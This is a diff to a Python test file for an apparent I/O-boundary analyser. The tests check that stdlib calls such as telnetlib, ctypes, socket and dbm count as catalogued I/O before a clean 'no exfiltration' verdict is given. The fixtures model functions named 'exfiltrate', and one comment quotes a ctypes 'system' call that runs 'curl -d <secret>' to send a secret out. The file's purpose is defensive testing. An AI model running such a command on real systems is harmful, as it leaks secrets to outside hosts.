@@ -96,9 +96,9 @@ TELNET_EDGES = [
     {"src": "python:main.py:5-8:exfiltrate:function",
      "dst": "python:telnetlib:0-0:Telnet:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:write:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:write:external_symbol", "is_resolved": False, "type": "calls"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:close:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:close:external_symbol", "is_resolved": False, "type": "calls"},
     {"src": "python:main.py:11-12:main:function",
      "dst": "python:os:0-0:os.environ:external_symbol", "type": "module_attr_ref"},
 ]
@@ -113,7 +113,7 @@ SSL_EDGES = [
     {"src": "python:main.py:5-8:exfiltrate:function",
      "dst": "python:ssl:0-0:SSLSocket:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:sendall:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:sendall:external_symbol", "is_resolved": False, "type": "calls"},
 ]
 
 #: ``ctypes.CDLL("libc.so.6").system(b"curl -d <secret> http://...")``.
@@ -123,7 +123,7 @@ CTYPES_EDGES = [
     {"src": "python:main.py:5-7:exfiltrate:function",
      "dst": "python:ctypes:0-0:CDLL:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-7:exfiltrate:function",
-     "dst": "python:external:0-0:system:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:system:external_symbol", "is_resolved": False, "type": "calls"},
 ]
 
 #: THE ORIGINAL FIXTURES HERE GRADUATED. ``os.sendfile`` and ``os.open`` +
@@ -155,6 +155,65 @@ SOCKET_CONNECT_EDGES = [
      "dst": "python:os:0-0:os.O_WRONLY:external_symbol", "type": "module_attr_ref"},
 ]
 
+#: 2026-09-06 (WI-dupok, the third completeness leg): ``ctypes`` GRADUATED --
+#: CDLL / cdll.LoadLibrary / find_library are rowed fs_read and the module is
+#: granted -- and ``socket.create_connection`` is rowed net_send. Both were the
+#: fixtures here, and both now classify, which is the fix these tests asked
+#: for (the same graduation the os fixtures went through above). The
+#: PRINCIPLES are unchanged and repointed: Arm 1 at ``termios`` (no rows, no
+#: grant, a terminal is real I/O), Arm 2 at ``socket.gethostbyname`` (a DNS
+#: lookup at the module slot of a partially-catalogued module whose DNS
+#: functions are UNRULED -- WI-dupok escalated the ruling). The graduated
+#: fixtures stay as the positive controls below.
+#: ``termios.tcgetattr(fd)`` reads terminal state from a descriptor.
+TERMIOS_EDGES = [
+    {"src": "python:main.py:1-1:file:file",
+     "dst": "python:termios:0-0:termios:external_symbol", "type": "imports"},
+    {"src": "python:main.py:4-5:probe:function",
+     "dst": "python:termios:0-0:tcgetattr:external_symbol", "type": "calls"},
+]
+#: ``socket.gethostbyname(host)`` -- a DNS lookup at the module slot.
+#: 2026-09-08 (WI-dozul): GRADUATED. The six resolver functions are rowed
+#: ``net_recv`` and ``socket`` is granted, so this fixture moved to the
+#: positive controls below and Arm 2 repointed. THIRD REPOINT OF THIS ARM --
+#: ``os`` graduated, then ``ctypes`` and ``socket.create_connection``, now the
+#: rest of ``socket`` -- which is the arm working, not failing: it holds a
+#: module the catalogue has NOT finished, and the catalogue keeps finishing
+#: them. :func:`test_the_arm_2_fixtures_are_still_the_shape_arm_2_needs` below
+#: fails with the reason spelled out the next time one graduates, so the fourth
+#: repoint costs a rename rather than a re-derivation.
+SOCKET_GETHOSTBYNAME_EDGES = [
+    {"src": "python:main.py:1-1:file:file",
+     "dst": "python:socket:0-0:socket:external_symbol", "type": "imports"},
+    {"src": "python:main.py:4-5:leak:function",
+     "dst": "python:socket:0-0:gethostbyname:external_symbol", "type": "calls"},
+]
+
+#: ARM 2, MEMBER 1 (2026-09-08). ``dbm.whichdb(filename)`` OPENS the file and
+#: reads its magic bytes to decide which dbm implementation wrote it -- real
+#: filesystem I/O. ``dbm`` carries exactly one row (``dbm.open``, fs_read) and
+#: no completeness grant, which is precisely the shape this arm needs: some
+#: rows, not all, no grant.
+DBM_WHICHDB_EDGES = [
+    {"src": "python:main.py:1-1:file:file",
+     "dst": "python:dbm:0-0:dbm:external_symbol", "type": "imports"},
+    {"src": "python:main.py:4-5:probe:function",
+     "dst": "python:dbm:0-0:whichdb:external_symbol", "type": "calls"},
+]
+
+#: ARM 2, MEMBER 2 (2026-09-08). ``multiprocessing.Manager()`` STARTS A SERVER
+#: PROCESS and returns a proxy that talks to it over a socket -- real IPC.
+#: ``multiprocessing`` carries one row (``Pool``) and no grant; its Queue /
+#: Pipe / Process surfaces are catalogued as their own modules, so they do not
+#: vouch for this one.
+MULTIPROCESSING_MANAGER_EDGES = [
+    {"src": "python:main.py:1-1:file:file",
+     "dst": "python:multiprocessing:0-0:multiprocessing:external_symbol",
+     "type": "imports"},
+    {"src": "python:main.py:4-5:fan_out:function",
+     "dst": "python:multiprocessing:0-0:Manager:external_symbol",
+     "type": "calls"},
+]
 #: The negative control that already worked. If this one ever stops blocking,
 #: the fix went the wrong way and every assertion above passes vacuously.
 REQUESTS_EDGES = [
@@ -177,16 +236,17 @@ class TestNameRecognitionIsNotExamination:
 
     @pytest.mark.parametrize(
         ("module", "edges"),
-        [("telnetlib", TELNET_EDGES), ("ssl", SSL_EDGES), ("ctypes", CTYPES_EDGES)],
+        [("telnetlib", TELNET_EDGES), ("ssl", SSL_EDGES), ("termios", TERMIOS_EDGES)],
     )
     def test_rowless_stdlib_module_cannot_support_a_clean_verdict(
         self, module: str, edges: list[dict],
     ) -> None:
         coverage = _coverage(edges)
         assert coverage.complete is False, (
-            f"{module} carries no catalogue row and no completeness flag, so "
-            f"'no chains found' means 'none I could see'. Confirming here is "
-            f"the INV-buzab false all-clear."
+            f"{module} carries no completeness flag (telnetlib and termios no "
+            f"row at all; ssl rows for its sockets but not for "
+            f"create_default_context), so 'no chains found' means 'none I "
+            f"could see'. Confirming here is the INV-buzab false all-clear."
         )
         assert module in coverage.reason, (
             f"the reason must NAME {module} so the gap is actionable; got: "
@@ -199,22 +259,79 @@ class TestRowPresenceIsNotEnumeration:
 
     @pytest.mark.parametrize(
         ("what", "edges"),
-        [("socket.getaddrinfo", SOCKET_GETADDRINFO_EDGES),
-         ("socket.create_connection", SOCKET_CONNECT_EDGES)],
+        [("dbm.whichdb", DBM_WHICHDB_EDGES),
+         ("multiprocessing.Manager", MULTIPROCESSING_MANAGER_EDGES)],
     )
     def test_partially_catalogued_module_cannot_support_a_clean_verdict(
         self, what: str, edges: list[dict],
     ) -> None:
         coverage = _coverage(edges)
+        module = what.split(".")[0]
         assert coverage.complete is False, (
             f"{what} is real I/O through a module the catalogue only partially "
-            f"enumerates. Presence of SOME socket rows must not vouch for the "
-            f"rest (INV-zubuh). If socket has graduated the way os did, repoint "
-            f"this at the current partially-catalogued module — the principle "
-            f"also lives on a fixture catalogue in "
+            f"enumerates. Presence of SOME {module} rows must not vouch for the "
+            f"rest (INV-zubuh). If {module} has graduated the way os and socket "
+            f"did, repoint this at the current partially-catalogued module — "
+            f"the principle also lives on a fixture catalogue in "
             f"test_verify_claims_uncatalogued_module_coverage."
         )
-        assert "socket" in coverage.reason
+        assert module in coverage.reason
+
+    @pytest.mark.parametrize("module", ["dbm", "multiprocessing"])
+    def test_the_arm_2_fixtures_are_still_the_shape_arm_2_needs(
+        self, module: str,
+    ) -> None:
+        """THE GUARD ON THE FIXTURE ITSELF, added 2026-09-08 after the third
+        repoint of this arm.
+
+        Arm 2 needs a module that is PARTIALLY rowed and NOT granted. Both
+        halves can stop being true without anyone touching this file — a
+        completeness pass grants the module, or the last row is removed — and
+        when that happens the test above fails with a message about I/O
+        coverage, which is not the reason. This one fails with the reason.
+        """
+        catalog = load_catalog("python")
+        rowed = {p.name for p in catalog.primitives if p.module == module}
+        assert rowed, (
+            f"{module} has no rows left, so it can no longer demonstrate that "
+            f"SOME rows do not vouch for the rest. Repoint arm 2."
+        )
+        assert module not in catalog.module_completeness, (
+            f"{module} has been GRANTED completeness, so its unmatched calls "
+            f"are examined negatives by design and it can no longer serve as "
+            f"arm 2. Repoint arm 2 at a module that is partially rowed and "
+            f"ungranted, and move this fixture to the graduated controls."
+        )
+
+
+class TestTheGraduatedFixturesNowClassify:
+    """The positive controls WI-dupok created: the fixtures that used to pin
+    the false all-clear now reach the catalogue, which is what rowing them
+    was for. If either regresses, a row or a grant went missing."""
+
+    def test_ctypes_cdll_is_rowed_and_the_module_is_granted(self) -> None:
+        coverage = _coverage(CTYPES_EDGES)
+        assert coverage.complete is True, coverage.reason
+
+    def test_socket_create_connection_is_rowed(self) -> None:
+        coverage = _coverage(SOCKET_CONNECT_EDGES)
+        assert coverage.complete is True, coverage.reason
+
+    @pytest.mark.parametrize(
+        ("what", "edges"),
+        [("socket.getaddrinfo", SOCKET_GETADDRINFO_EDGES),
+         ("socket.gethostbyname", SOCKET_GETHOSTBYNAME_EDGES)],
+    )
+    def test_the_resolver_calls_are_rowed_and_socket_is_granted(
+        self, what: str, edges: list[dict],
+    ) -> None:
+        """WI-dozul, 2026-09-08. These two WERE arm 2 until the owner ruled
+        that a DNS lookup is ``net_recv`` and the grant WI-dupok withheld on
+        that ruling was discharged. Kept as positive controls exactly as
+        ``ctypes`` and ``create_connection`` were: the fixture that pinned the
+        false all-clear now pins the fix."""
+        coverage = _coverage(edges)
+        assert coverage.complete is True, coverage.reason
 
 
 class TestTheControlsThatMakeTheAboveMeanSomething:
@@ -379,11 +496,17 @@ class TestOnePredicateWithNoSecondHome:
 
         # Read each CALLER's own body, so a reformat cannot silently pass and a
         # caller that grew its own copy of either rule fails.
+        # WI-lavut moved the gate's walk into _adjudicate_external_modules so
+        # the load-bearing-grant set shares its iteration; the gate is the
+        # wrapper plus the walk, so the chain is asserted link by link.
+        assert "_adjudicate_external_modules" in inspect.getsource(
+            verify_claims._uncatalogued_external_modules,
+        ), "the coverage gate no longer delegates to the shared walk"
         bodies = {
             "Filter 2": inspect.getsource(io_boundary._compute_external_potential),
             "tagger": inspect.getsource(io_boundary.tag_io_boundaries),
             "coverage gate": inspect.getsource(
-                verify_claims._uncatalogued_external_modules,
+                verify_claims._adjudicate_external_modules,
             ),
         }
         assert "module_io_is_enumerated" in bodies["Filter 2"], (
@@ -860,8 +983,17 @@ class TestAProducerStampedLaunchIsAlsoOpaque:
         catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
         coverage = compute_boundary_coverage([edge], {"bash"}, {"bash": catalog})
         assert coverage.complete is False, coverage.reason
-        assert "curl.curl" in coverage.reason, (
+        # ``curl``, not ``curl.curl`` (INV-hosul): a bash launch puts the
+        # command in BOTH slots and the join spelled it twice. The PROPERTY
+        # this test is about is unchanged and is what the message still says —
+        # the slot fallback must spell a site exactly as the dst_ref branch
+        # does. That is why the collapse lives in the shared helper both
+        # branches call, rather than in either branch.
+        assert "curl" in coverage.reason, (
             f"the slot fallback must spell the site exactly as the dst_ref "
             f"branch does, or one disclosure reads differently from the other; "
             f"got: {coverage.reason!r}"
+        )
+        assert "curl.curl" not in coverage.reason, (
+            f"the site name is doubled again (INV-hosul); got: {coverage.reason!r}"
         )
